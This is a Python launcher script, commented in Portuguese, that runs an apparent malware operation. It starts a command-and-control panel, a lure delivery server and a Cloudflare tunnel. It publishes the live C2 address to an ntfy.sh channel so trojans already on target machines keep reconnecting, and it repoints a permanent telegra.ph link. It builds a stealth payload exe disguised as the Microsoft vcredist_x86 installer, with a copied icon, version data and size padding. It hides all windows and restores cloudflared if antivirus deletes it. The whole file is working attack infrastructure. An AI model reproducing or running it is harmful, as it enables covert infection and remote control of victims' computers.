#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Go live -- publica o kit inteiro atras de um link publico e mantem no ar.

    python golive.py --key <sua-key>            sobe tudo e imprime o link
    python golive.py --key <sua-key> --watch    fica vigiando e troca o link sozinho
    python golive.py --stop                     derruba tudo
    python golive.py --status                   o que esta rodando agora

O exe NAO carrega mais a URL do tunel. Ele carrega o canal de rendezvous
(ntfy.sh), le o endereco vivo de la a cada 10 min e segue a mudanca sozinho.
Resultado: o tunel pode cair e voltar quantas vezes for -- os exes ja
distribuidos continuam achando voce.
"""

import argparse
import hashlib
import hmac
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PY = sys.executable
CF = os.path.join(HERE, "cloudflared.exe")
TUNNEL_LOG = os.path.join(HERE, "tunnel.log")
LURE_PORT = 8888
PANEL_PORT = 8080
TUNNEL_RE = re.compile(r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com")

DEFAULT_KEY = "raf-7c1f4b2e9a3d5f8b6c0e2a4d"
ICON_SRC = r"E:\Downloads\vcredist_x86.exe"
VERSION_FILE = os.path.join(HERE, "vcredist_version.txt")
PAD_DEFAULT = 271028
SECRET_FILE = os.path.join(HERE, "link_secret.txt")


def channel_for(key):
    """Canal publico de rendezvous derivado da chave (ninguem adivinha)."""
    slug = re.sub(r"[^a-z0-9]", "", key.lower())
    return "https://ntfy.sh/raf-%s-cfg" % slug


CREATE_NO_WINDOW = 0x08000000


def hidden():
    """Nada de janela de console piscando: todo filho nasce invisivel."""
    if os.name != "nt":
        return {}
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    return {"creationflags": CREATE_NO_WINDOW, "startupinfo": si}


def run_hidden(args, **kw):
    kw.update(hidden())
    return subprocess.run(args, **kw)


def exe_path(name):
    return os.path.join(HERE, "dist", name + ".exe")


def port_open(port):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=1)
        s.close()
        return True
    except OSError:
        return False


def wait_port(port, timeout=25):
    end = time.time() + timeout
    while time.time() < end:
        if port_open(port):
            return True
        time.sleep(0.4)
    return False


def spawn(args, logname, cwd=HERE):
    log = open(os.path.join(HERE, logname), "a", encoding="utf-8", buffering=1)
    p = subprocess.Popen([PY] + args, cwd=cwd, stdout=log, stderr=log,
                         stdin=subprocess.DEVNULL, **hidden())
    return p


def kill_py(needle):
    """Mata python/pythonw cujo command line contem needle."""
    try:
        out = run_hidden(
            ["wmic", "process", "where",
             "name='python.exe' or name='pythonw.exe'", "get", "ProcessId,CommandLine"],
            capture_output=True, text=True).stdout
    except Exception:
        return 0
    n = 0
    for line in out.splitlines():
        if needle in line:
            m = re.search(r"(\d+)\s*$", line)
            if m:
                run_hidden(["taskkill", "/PID", m.group(1), "/F"], capture_output=True)
                n += 1
    return n


# ------------------------------------------------------------------ rendezvous
def publish(channel, base, extra=None):
    """Grava o endereco vivo no canal publico (sem conta, sem token)."""
    payload = {"base": base, "ts": int(time.time()), "ok": True}
    if extra:
        payload.update(extra)
    try:
        req = urllib.request.Request(
            channel, data=json.dumps(payload).encode(),
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            method="POST")
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status == 200
    except Exception:
        return False


def channel_read(channel):
    try:
        req = urllib.request.Request(channel.rstrip("/") + "/json?poll=1&since=all",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:
        return ""
    best = ""
    for line in raw.splitlines():
        try:
            m = json.loads(line)
        except Exception:
            continue
        if m.get("event") != "message":
            continue
        try:
            best = json.loads(m.get("message") or "{}").get("base") or best
        except Exception:
            pass
    return best


def url_ok(url, timeout=20, path="/"):
    """O tunel esta de pe? 404 tambem serve: quer dizer que o edge achou a origem."""
    import urllib.error
    try:
        with urllib.request.urlopen(
                urllib.request.Request(url.rstrip("/") + path,
                                       headers={"User-Agent": "Mozilla/5.0"}),
                timeout=timeout) as r:
            return r.status == 200
    except urllib.error.HTTPError as e:
        return e.code in (200, 401, 404)
    except Exception:
        return False


def publish_share(base, name="vcredist_x86.exe", secret=""):
    """Atualiza o link permanente (telegra.ph) para o endereco atual."""
    args = [PY, os.path.join(HERE, "share.py"), "--base", base, "--name", name]
    if secret:
        args += ["--secret", secret]
    r = subprocess.run(args,
                       cwd=HERE, capture_output=True, text=True,
                       encoding="utf-8", errors="replace", **hidden())
    out = (r.stdout or "") + (r.stderr or "")
    for line in out.splitlines():
        if "link permanente" in line:
            return line.split(":", 1)[1].strip()
    return ""


# ----------------------------------------------------------------------- tunel
CF_URL = ("https://github.com/cloudflare/cloudflared/releases/latest/download/"
          "cloudflared-windows-amd64.exe")


def ensure_cloudflared():
    """Se o cloudflared sumir (antivirus, limpeza), baixa de volta sozinho."""
    if os.path.isfile(CF) and os.path.getsize(CF) > 5_000_000:
        return True
    print("[*] cloudflared ausente -- baixando de volta (55 MB)...")
    try:
        req = urllib.request.Request(CF_URL, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=600) as r, open(CF, "wb") as f:
            while True:
                chunk = r.read(1 << 20)
                if not chunk:
                    break
                f.write(chunk)
        print("    ok: %d bytes" % os.path.getsize(CF))
        return True
    except Exception as exc:
        print("    falhou: %s" % exc)
        return False


def start_tunnel():
    if not ensure_cloudflared():
        raise SystemExit("[!] cloudflared.exe nao encontrado em %s" % HERE)

    url_box = []
    p = subprocess.Popen(
        [CF, "tunnel", "--url", "http://127.0.0.1:%d" % PANEL_PORT, "--no-autoupdate"],
        cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, text=True, bufsize=1, **hidden())

    def reader():
        try:
            for line in p.stdout:
                with open(TUNNEL_LOG, "a", encoding="utf-8") as f:
                    f.write(line)
                m = TUNNEL_RE.search(line)
                if m and not url_box:
                    url_box.append(m.group(0))
        except Exception:
            pass

    threading.Thread(target=reader, daemon=True).start()

    end = time.time() + 60
    while time.time() < end:
        if url_box:
            return p, url_box[0]
        if p.poll() is not None:
            raise SystemExit("[!] cloudflared saiu (codigo %s) -- veja tunnel.log"
                             % p.returncode)
        time.sleep(0.5)
    raise SystemExit("[!] cloudflared nao devolveu URL em 60s -- veja tunnel.log")


def kill_tunnel():
    run_hidden(["taskkill", "/IM", "cloudflared.exe", "/F"], capture_output=True)


# ------------------------------------------------------------------------ exe
def payload_has_bootstrap(payload):
    try:
        with open(payload, encoding="utf-8", errors="replace") as f:
            return re.search(r'^BOOTSTRAP\s*=\s*"https?://', f.read(), re.M) is not None
    except OSError:
        return False


def build_exe(key, base, host, port, channel, name, pad, icon=None, version_file=None,
              theme=None):
    print("[*] gerando o exe (leva ~1 min)...")
    payload = os.path.join(HERE, "payload_%s.py" % re.sub(r"\W", "_", name))
    args = [PY, os.path.join(HERE, "builder.py"),
            "--host", host, "--port", str(port), "--key", key,
            "--bootstrap", channel, "--http", base,
            "--stealth", "--exe", "--name", name, "-o", payload]
    if pad:
        args += ["--pad", str(pad)]
    if icon and os.path.isfile(icon):
        args += ["--icon", icon]
    if version_file and os.path.isfile(version_file):
        args += ["--version-file", version_file]
    r = subprocess.run(args, cwd=HERE, capture_output=True, text=True, **hidden())
    exe = exe_path(name)
    if not os.path.isfile(exe):
        print(r.stdout[-1500:])
        print(r.stderr[-1500:])
        raise SystemExit("[!] falha ao gerar o exe")
    return exe


# -------------------------------------------------------------------- servicos
def panel_key_ok(key):
    """Pergunta ao painel no ar se ele autentica um poll assinado com esta chave."""
    body = json.dumps({"sid": "keycheck", "info": {}}).encode()
    sig = hmac.new(key.encode(), body, hashlib.sha256).hexdigest()
    req = urllib.request.Request(
        "http://127.0.0.1:%d/c2/poll" % PANEL_PORT, data=body,
        headers={"Content-Type": "application/json", "X-Sig": sig})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return "cmds" in r.read().decode()
    except Exception:
        return False


def start_panel(key, port, token):
    kill_py("web.py")
    time.sleep(2)
    spawn(["web.py", "--c2-port", str(port), "--port", str(PANEL_PORT),
           "--deliver-port", str(LURE_PORT),
           "--key", key, "--token", token], "panel.log")
    return wait_port(PANEL_PORT)


def ensure_panel(key, port, token, verbose=True):
    if port_open(PANEL_PORT) and panel_key_ok(key):
        if verbose:
            print("      ja estava no ar, chave confere")
        return True
    if port_open(PANEL_PORT) and verbose:
        print("      painel no ar com chave diferente -- reiniciando")
    ok = start_panel(key, port, token)
    if verbose:
        print("      no ar em http://127.0.0.1:%d/" % PANEL_PORT if ok else "      FALHOU")
    return ok


def start_deliver(exe, theme, token, name=None, secret=""):
    args = ["deliver.py", "--payload", exe, "--theme", theme,
            "--port", str(LURE_PORT), "--auto", "--token", token]
    if name:
        args += ["--name", name]
    if secret:
        args += ["--secret", secret]
    spawn(args, "deliver.log")
    return wait_port(LURE_PORT)


def ensure_deliver(exe, theme, token, name=None, secret=""):
    if port_open(LURE_PORT):
        return True
    return start_deliver(exe, theme, token, name, secret)


PANEL_LINK_FILE = os.path.join(HERE, "panel_link.txt")


def save_panel_link(url, token):
    """Link publico do painel + repoint da pagina permanente."""
    link = "%s/?t=%s" % ((url or "").rstrip("/"), token)
    try:
        with open(PANEL_LINK_FILE, "w", encoding="utf-8") as f:
            f.write(link + "\n")
    except OSError:
        pass
    # a pagina do telegra.ph e o bookmark do dono: sempre aponta pro link atual
    try:
        import panel_page
        st = panel_page.update(link)
        print("[watch] pagina permanente : %s" % st.get("url"))
    except Exception as exc:
        print("[watch] pagina permanente falhou: %s" % exc)
    return link


def link_secret():
    """Segredo do link: sem ele o site responde 404 para qualquer um."""
    try:
        with open(SECRET_FILE, encoding="utf-8") as f:
            s = f.read().strip()
        if s:
            return s
    except OSError:
        pass
    import secrets as _s
    s = _s.token_urlsafe(9)
    with open(SECRET_FILE, "w", encoding="utf-8") as f:
        f.write(s)
    return s


# ---------------------------------------------------------------------- status
def status():
    print("painel  8080 : %s" % ("no ar" if port_open(PANEL_PORT) else "parado"))
    print("isca    8888 : %s" % ("no ar" if port_open(LURE_PORT) else "parado"))
    cf = run_hidden(["tasklist", "/FI", "IMAGENAME eq cloudflared.exe"],
                    capture_output=True, text=True).stdout
    print("tunel        : %s" % ("ativo" if "cloudflared" in cf else "parado"))
    if os.path.isfile(TUNNEL_LOG):
        with open(TUNNEL_LOG, encoding="utf-8", errors="replace") as f:
            urls = TUNNEL_RE.findall(f.read())
        if urls:
            print("ultimo link  : %s" % urls[-1])
    ch = channel_for(DEFAULT_KEY)
    live = channel_read(ch)
    print("canal        : %s" % ch)
    print("endereco vivo: %s" % (live or "(nada publicado)"))
    try:
        with open(PANEL_LINK_FILE, encoding="utf-8") as f:
            print("painel       : %s" % f.read().strip())
    except OSError:
        print("painel       : (ainda nao salvo)")


def stop():
    kill_tunnel()
    print("tunel parado")
    print("processos encerrados: %d" % (kill_py("deliver.py") + kill_py("web.py")))


# ----------------------------------------------------------------------- watch
def tunnel_running():
    out = run_hidden(["tasklist", "/FI", "IMAGENAME eq cloudflared.exe"],
                     capture_output=True, text=True).stdout or ""
    return "cloudflared" in out.lower()


def watch(a, channel, exe, secret="", publish_ok=True):
    """Mantem painel, isca e tunel vivos sem abrir janela e sem reiniciar a toa."""
    url = channel_read(channel) or ""
    adopted = tunnel_running()
    probe = ("/i?k=" + secret) if secret else "/"
    print("[watch] vigiando a cada 30s -- ctrl+c encerra")
    print("[watch] tunel ja no ar: %s (%s)" % (adopted, url or "sem endereco"))
    if adopted and url:
        # adotou o tunel: garante painel/isca vivos e links apontando pra ele
        if not port_open(PANEL_PORT) or not panel_key_ok(a.key):
            ensure_panel(a.key, a.port, a.token, verbose=False)
        if not port_open(LURE_PORT):
            start_deliver(exe, a.theme, a.token, a.name, secret)
        save_panel_link(url, a.token)
        # o canal e o que o exe do alvo le pra achar o C2: publica sempre,
        # mesmo em --no-publish (que vale so pra pagina do telegra.ph)
        if publish(channel, url):
            print("[watch] canal : %s" % url)
        if publish_ok:
            try:
                print("[watch] link permanente : %s" % publish_share(url, secret=secret))
            except Exception as exc:
                print("[watch] link permanente falhou: %s" % exc)
    last_pub = time.time()
    bad = 0
    pfail = 0
    last_start = 0.0
    while True:
        try:
            # 2 falhas seguidas antes de reiniciar: o painel fica ocupado
            # durante comandos longos e reiniciar no primeiro erro derrubava
            # o site por 30s sem necessidade.
            if not port_open(PANEL_PORT):
                pfail += 1
            elif not panel_key_ok(a.key):
                pfail += 1
            else:
                pfail = 0
            if pfail >= 2:
                print("[watch] painel caiu -- subindo")
                ensure_panel(a.key, a.port, a.token, verbose=False)
                pfail = 0
            if not port_open(LURE_PORT):
                print("[watch] isca caiu -- subindo")
                start_deliver(exe, a.theme, a.token, a.name, secret)

            if not publish_ok:
                # site publicado em outro host: nao mexe em tunel nem em pagina,
                # mas o canal do payload tem de ficar fresco (o exe do alvo le ele)
                if url and time.time() - last_pub > 600:
                    if publish(channel, url):
                        print("[watch] canal atualizado : %s" % url)
                    last_pub = time.time()
                time.sleep(30)
                continue

            running = tunnel_running()
            if running and url and not url_ok(url, path=probe):
                bad += 1
                print("[watch] tunel sem resposta (%d/4)" % bad)
            else:
                bad = 0
            dead = (not running) or bad >= 4

            # nunca reinicia antes de 3 minutos, mesmo que pareca morto
            if dead and (time.time() - last_start) > 180:
                print("[watch] tunel fora -- reabrindo (uma vez, invisivel)")
                kill_tunnel()
                time.sleep(3)
                cf, url = start_tunnel()
                last_start = time.time()
                bad = 0
                print("[watch] novo link : %s/" % url)
                for _ in range(30):
                    if url_ok(url, timeout=10, path=probe):
                        break
                    time.sleep(2)
                publish(channel, url)
                save_panel_link(url, a.token)
                if publish_ok:
                    perm = publish_share(url, secret=secret)
                    print("[watch] link permanente repontado : %s" % perm)
                else:
                    print("[watch] modo --no-publish: canal e pagina intocados")
                last_pub = time.time()
            elif not dead and url and time.time() - last_pub > 600:
                publish(channel, url)          # mantem o canal fresco (cache 12h)
                print("[watch] canal atualizado : %s" % url)
                last_pub = time.time()
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            print("[watch] erro: %s" % exc)
        try:
            time.sleep(30)
        except KeyboardInterrupt:
            raise


def main():
    ap = argparse.ArgumentParser(description="publica o kit inteiro")
    ap.add_argument("--key", default=DEFAULT_KEY)
    ap.add_argument("--port", type=int, default=4444, help="porta do C2 tcp (fallback)")
    ap.add_argument("--host", default="127.0.0.1", help="host tcp (fallback)")
    ap.add_argument("--theme", default="vcredist")
    ap.add_argument("--token", default="raf2026")
    ap.add_argument("--name", default=None, help="nome do arquivo entregue")
    ap.add_argument("--exe-name", default="vcredist_x86",
                    help="nome do exe gerado (default vcredist_x86)")
    ap.add_argument("--icon", default=ICON_SRC)
    ap.add_argument("--version-file", default=VERSION_FILE)
    ap.add_argument("--pad", type=int, default=PAD_DEFAULT,
                    help="padding para fixar o tamanho em 10,8 MB")
    ap.add_argument("--rebuild", action="store_true",
                    help="forca recompilar o exe mesmo ja tendo o canal embutido")
    ap.add_argument("--watch", action="store_true",
                    help="fica vigiando e republica o endereco quando o tunel gira")
    ap.add_argument("--no-publish", action="store_true",
                    help="mantem painel/isca/tunel vivos sem tocar no canal nem na "
                         "pagina permanente (usado quando o site ja vive em outro host)")
    ap.add_argument("--log", default=None,
                    help="grava a saida neste arquivo (usado pelo vigia sem console)")
    ap.add_argument("--stop", action="store_true")
    ap.add_argument("--status", action="store_true")
    a = ap.parse_args()

    if a.log:
        lf = open(os.path.join(HERE, a.log), "a", encoding="utf-8", buffering=1)
        sys.stdout = lf
        sys.stderr = lf
        print("\n==== %s ====" % time.strftime("%d/%m/%Y %H:%M:%S"))

    if a.status:
        return status() or 0
    if a.stop:
        return stop() or 0

    secret = link_secret()
    channel = channel_for(a.key)
    exe = exe_path(a.exe_name)
    payload = os.path.join(HERE, "payload_%s.py" % re.sub(r"\W", "_", a.exe_name))

    print("[1/6] painel")
    if not ensure_panel(a.key, a.port, a.token):
        raise SystemExit("[!] o painel nao subiu -- veja panel.log")
    print("      no ar em http://127.0.0.1:%d/" % PANEL_PORT)

    print("[2/6] servidor de entrega")
    if not ensure_deliver(exe, a.theme, a.token, a.name, secret):
        raise SystemExit("[!] o servidor de entrega nao subiu -- veja deliver.log")
    print("      no ar em http://127.0.0.1:%d/" % LURE_PORT)

    if a.no_publish:
        print("[3/6] tunel publico: pulado (--no-publish, o site vive em outro host)")
        print("[4/6] canal de rendezvous: intocado")
        url = ""
        panel_url = "http://127.0.0.1:%d/?t=%s" % (PANEL_PORT, a.token)
        permanent = "(nao publicado)"
    else:
        print("[3/6] tunel publico (aponta para o painel 8080)")
        kill_tunnel()
        time.sleep(1)
        if os.path.isfile(TUNNEL_LOG):
            try:
                os.remove(TUNNEL_LOG)
            except OSError:
                pass
        cf, url = start_tunnel()
        print("      %s" % url)

        print("[4/6] canal de rendezvous")
        print("      %s" % channel)
        print("      publicado: %s" % ("ok" if publish(channel, url) else "FALHOU"))

        print("      atualizando o link permanente...")
        panel_url = save_panel_link(url, a.token)
        permanent = publish_share(url, secret=secret)
        print("      %s" % (permanent or "FALHOU (veja share.json)"))

    print("[5/6] exe")
    if os.path.isfile(exe) and payload_has_bootstrap(payload) and not a.rebuild:
        print("      reaproveitando %s (ja tem o canal embutido)" % exe)
    else:
        build_exe(a.key, url or ("http://127.0.0.1:%d" % PANEL_PORT), a.host, a.port, channel,
                  a.exe_name, a.pad, a.icon, a.version_file)
        print("      %s (%.3f MB)" % (exe, os.path.getsize(exe) / 1048576.0))

    print("[6/6] reiniciando entrega com o exe novo")
    kill_py("deliver.py")
    time.sleep(1)
    if not start_deliver(exe, a.theme, a.token, a.name, secret):
        raise SystemExit("[!] entrega nao voltou -- veja deliver.log")
    print("      ok")

    print("")
    print("=" * 64)
    print("  SITE DO PAINEL   : %s" % panel_url)
    print("  LINK PARA MANDAR : %s/i?k=%s" % (url, secret))
    print("  LINK PERMANENTE  : %s" % (permanent or "(veja share.json)"))
    print("  PAINEL LOCAL     : http://127.0.0.1:%d/?t=%s" % (PANEL_PORT, a.token))
    print("  VISITAS          : http://127.0.0.1:%d/log?t=%s" % (LURE_PORT, a.token))
    print("  CANAL            : %s" % channel)
    print("=" * 64)
    print("")
    print("o link permanente nunca muda: se o tunel girar, ele e repontado sozinho.")
    print("para nunca cair: python golive.py --watch")
    print("para derrubar tudo: python golive.py --stop")

    if a.watch:
        print("")
        watch(a, channel, exe, secret, publish_ok=not a.no_publish)
    return 0


if __name__ == "__main__":
    sys.exit(main())
